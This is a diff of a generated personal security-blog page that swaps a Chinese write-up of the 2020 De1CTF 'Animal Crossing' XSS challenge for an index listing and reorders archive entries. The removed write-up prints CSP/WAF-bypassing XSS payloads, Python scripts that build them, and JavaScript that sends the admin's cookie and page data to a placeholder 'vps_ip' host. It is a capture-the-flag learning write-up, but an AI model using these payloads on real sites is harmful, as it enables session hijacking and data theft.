@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>2020 De1CTF &amp; Animal Crossing · Sky&#39;s blog</title>
+    <title>Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >Sky&#39;s blog</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">2020 De1CTF & Animal Crossing</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>Sky's blog</a>
 </header>
@@ -231,74 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            2020 De1CTF & Animal Crossing
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1,220</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/01/09</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -399,63 +338,41 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>五一的时候参与了一下De1CTF，里面有一道题让我印象很深刻：Animal Crossing。</p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题干描述如下：<br><img src="./_image/2020-05-06/2020-05-06-20-18-20.png" alt=""><br>可能作者很喜欢玩动森），进去之后是一个如下页面：<br><img src="./_image/2020-05-06/2020-05-06-20-18-42.png" alt=""><br>我们随机输入一些字符串后，来到下一页：<br><img src="./_image/2020-05-06/2020-05-06-20-19-10.png" alt=""><br>此时我们的url：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&amp;island=vwev&amp;fruit=&amp;name=ewvc&amp;data=vcwevcw</span><br></pre></td></tr></table></figure></p>
-<p>我们随机更改，页面会相应变化，同时发现有admin report界面：<br><img src="./_image/2020-05-06/2020-05-06-20-19-41.png" alt=""><br>那么很明显了，这应该是一个xss打管理员cookie的题目。<br>尝试fuzz了一下各个参数，发现攻击点应该在data参数上，但其过滤了大量的字符，并且设有csp,导致常规的xss做法并不适用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;;object-src &apos;none&apos;;</span><br></pre></td></tr></table></figure></p>
-<p><img src="./_image/2020-05-06/2020-05-06-20-20-45.png" alt=""></p>
-<h2 id="原型链构造"><a href="#原型链构造" class="headerlink" title="原型链构造"></a>原型链构造</h2><p><img src="./_image/2020-05-06/2020-05-06-20-21-26.png" alt=""><br>发现我们的代码会被拼接在此处进行执行，那么首先进行闭合：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&amp;island=vwev&amp;fruit=&amp;name=ewvc&amp;data=%27||1111//</span><br></pre></td></tr></table></figure></p>
-<p><img src="./_image/2020-05-06/2020-05-06-20-22-16.png" alt=""><br>那么如何利用1111部分的代码，让我们达到执行任意代码的目的呢？<br>这里就和一些trick有关，我们看一个例子：<br><img src="./_image/2020-05-06/2020-05-06-20-25-44.png" alt=""><br>可以看到，对于toString，其会将其他值以字符串形式表示，特别的，对于对象，其会转换为[object Object]，而对于数组，其会转换为Array.join(‘,’)的形式进行拼接。但是对于valueOf( )，其返回的则是自身。<br>那我们再看一个例子：<br><img src="./_image/2020-05-06/2020-05-06-20-31-27.png" alt=""><br>在一元加操作符操作对象的时候，会先调用对象的valueOf方法来转换，如此一来，我们可以利用这一特点，进行函数构造执行代码。那么我们回到题目中：<br><img src="./_image/2020-05-06/2020-05-06-20-34-39.png" alt=""><br>如此一来，我们就可以定义function内容：<br><img src="./_image/2020-05-06/2020-05-06-20-35-06.png" alt=""><br>那么我们再搭配上valueOf：<br><img src="./_image/2020-05-06/2020-05-06-20-36-55.png" alt=""><br>当然，代码中没有+1的操作，那么怎么触发valueOf呢？其实很简单：<br><img src="./_image/2020-05-06/2020-05-06-20-40-04.png" alt=""><br>如此一来，我们即可进行任意代码执行。</p>
-<h2 id="xss打cookie"><a href="#xss打cookie" class="headerlink" title="xss打cookie"></a>xss打cookie</h2><p>在可执行任意代码后，我们下一步就是进行location跳转打cookie:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=<span class="string">'http://vps_ip?flag='</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure></p>
-<p>但是由于题目设置了较为恶心的waf，所以我们这里选择利用atob编码绕过：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">s = <span class="string">"""</span></span><br><span class="line"><span class="string">location='http://vps_ip?flag='+document.cookie</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">data=b64encode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>).replace(<span class="string">'+'</span>, <span class="string">'%2b'</span>).replace(<span class="string">'='</span>,<span class="string">'%3d'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27"</span>+ data +<span class="string">"%27))&#125;%2b1//"</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p>
-<p>编写代码如上，以用于自动生成exp。<br>攻击后即可得到管理员cookie:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure></p>
-<h2 id="xss打管理员页面"><a href="#xss打管理员页面" class="headerlink" title="xss打管理员页面"></a>xss打管理员页面</h2><p>但很显然只有一半flag是不行的，于是想到读一下管理员页面信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=&apos;http://vps_ip?flag=&apos;+btoa(document.body.innerHTML)</span><br></pre></td></tr></table></figure></p>
-<p>得到信息解码后如下：<br><img src="./_image/2020-05-06/2020-05-06-20-45-08.png" alt=""><br>可以发现管理员界面有无数张图片= =，猜想flag要么是其中一张，要么是拼接所有图片得到。那么尝试访问目录访问图片，但发现均为500，无法直接访问。<br>于是这里想到方案有2种：<br>1.利用js截图，将页面带出<br>2.将图片全部传出来<br>在解题中我选择了第二种思路，那么如何把图片传出呢？这里我们发现题目还有一个上传功能，可以让我们上传头像，但是只允许png和jpg后缀，这也是为何我选择了第二种方法，因为后缀名没法bypass（但是后来交流发现，不需要bypass后缀= =，我太菜啦！）<br>那么这里的思路转变为让管理员将图片上传后，再将return的访问url传出到我们的vps，我们即可获取到图片，于是写出如下脚本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">s = <span class="string">"""</span></span><br><span class="line"><span class="string">(async()=&gt;&#123;</span></span><br><span class="line"><span class="string">    const arr = []</span></span><br><span class="line"><span class="string">    for(let i=1;i&lt;=9;i++) &#123;</span></span><br><span class="line"><span class="string">        res = await fetch(`/island/test_$0&#123;i&#125;.png`)</span></span><br><span class="line"><span class="string">        data = await res.blob()</span></span><br><span class="line"><span class="string">        const os = new FormData();</span></span><br><span class="line"><span class="string">        const mf = new File([data], "name.png");</span></span><br><span class="line"><span class="string">        os.append("file", mf);</span></span><br><span class="line"><span class="string">        r = await fetch("/upload", &#123;method: "POST",body: os&#125;)</span></span><br><span class="line"><span class="string">        data = await r.json()</span></span><br><span class="line"><span class="string">        arr.push(data.data)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location="http://vps_ip/?c="+btoa(JSON.stringify(arr))</span></span><br><span class="line"><span class="string">&#125;)();</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">data=b64encode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>).replace(<span class="string">'+'</span>, <span class="string">'%2b'</span>).replace(<span class="string">'='</span>,<span class="string">'%3d'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27"</span>+ data +<span class="string">"%27))&#125;%2b1//"</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p>
-<p>然后将400张图拼在一起，得到后半段flag：<br><img src="./_image/2020-05-06/2020-05-06-20-51-24.png" alt=""><br>当然这里额外提一下，其实引入js库，不需要bypass js后缀，我们利用如下方式即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(`/static/images/xxxxxx.png`).then(res=&gt;res.text()).then(txt=&gt;eval(txt))</span><br></pre></td></tr></table></figure></p>
-<p>然后引入js库，截图后将图片利用upload上传，再把return url发送到我们服务器即可~</p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道xss是我认为De1CTF比较有趣的一道题目了，首先考的就是纯web，其次出题的思路比较好，而不是一味的恶心人= =，点个赞~</p>
-
+            <main class="main index-page">
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/02/09/2020 CodeGate Web Writeup/" >
+            
+                <span>2020 CodeGate Web Writeup</span>
+        </a>
+        <div class="abstract-content">
+            CSP随手尝试：1110.10.147.166/view.php?name=123&amp;p1=456&amp;p2=789
+得到如下url:1/api.php?sig=43bb08065a4d2217ca3881e93c65276b&amp;q=TVRJeixORFUyLE56ZzU=
+不难发现，view.php的功能，是帮助我们把name、p1、p2转化格式后，发送给api.php。其中q的值为：同时存在一个report功能：如果把api.php的payload传过去，就能触发XSS，但是考虑到题目有CSP：1Content-Security-Policy: default-src...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/02/09</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+</div>
+            
+        </div>
     </article>
-    <!-- reward  -->
-    <div style='text-align:center;margin:100px auto auto auto;'>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
-    <a class="fancy-link" href="/intro/alipay.png" alt="" data-fancybox="group" data-caption=""><img style='width:30%;margin:auto 50px auto 50px;' src="/intro/alipay.png" alt=""></a>
-    <a class="fancy-link" href="/intro/wechat.jpg" alt="" data-fancybox="group" data-caption=""><img style='width:30%;margin:auto 50px auto 50px;' src="/intro/wechat.jpg" alt=""></a>
-    <!-- license  -->
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2020/01/09/2020 CodeGate Web Writeup/" title= "2020 CodeGate Web Writeup">
-                    <div class="nextTitle">2020 CodeGate Web Writeup</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/01/09/Deemon & CSRF漏洞动态分析工具/" title= "Paper Summary & Deemon & Detecting CSRF with Dynamic Analysis and Property Graphs">
-                    <div class="prevTitle">Paper Summary & Deemon & Detecting CSRF with Dynamic Analysis and Property Graphs</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -544,24 +461,6 @@ height:50vh;
     </div>
     <!-- toc -->
     
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原型链构造"><span class="toc-number">3.</span> <span class="toc-text">原型链构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss打cookie"><span class="toc-number">4.</span> <span class="toc-text">xss打cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss打管理员页面"><span class="toc-number">5.</span> <span class="toc-text">xss打管理员页面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol>
-    </div>
-    
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
     <ul class="sidebar-tabs sidebar-tabs-active-0">
@@ -572,24 +471,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -4368,12 +4249,37 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/" >Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2020/05/29/Deemon & CSRF漏洞动态分析工具/" >Paper Summary & Deemon & Detecting CSRF with Dynamic Analysis and Property Graphs</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Web缓存利用分析(一)/" >Web缓存利用分析(一)</a>
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href= "/2020/05/14/Web缓存利用分析(一)/" >Web缓存利用分析(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href= "/2020/05/05/Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/" >Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2020/05/03/2020 De1CTF & Animal Crossing/" >2020 De1CTF & Animal Crossing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href= "/2020/04/29/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" >Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href= "/2020/02/09/2020 CodeGate Web Writeup/" >2020 CodeGate Web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/" >Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</a>
         </li>
     
     
@@ -4384,31 +4290,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/2020/01/13/Paper-Summary-Detecting-Webshell-Based-on-Random-Forest-with-FastText/" >Paper Summary & Detecting Webshell Based on Random Forest with FastText</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/2020 CodeGate Web Writeup/" >2020 CodeGate Web Writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/2020 De1CTF & Animal Crossing/" >2020 De1CTF & Animal Crossing</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Deemon & CSRF漏洞动态分析工具/" >Paper Summary & Deemon & Detecting CSRF with Dynamic Analysis and Property Graphs</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" >Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/" >Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</a>
         </li>
     
     
@@ -5440,12 +5321,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
         </li>
     
     
@@ -5478,27 +5359,27 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
-        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
-    
         <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
         <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
     
         <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
     
         <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
     
+        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+    
         <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
     
-        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
+    
+        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
     
         <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
     
         <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
-    
-        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
-    
-        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
@@ -5573,9 +5454,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
     
-        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
-    
         <span class="sidebar-category-name" data-categories="paper"><span class="iconfont-archer">&#xe60a;</span>paper</span>
+    
+        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
     
         <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
     
@@ -5611,8 +5492,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
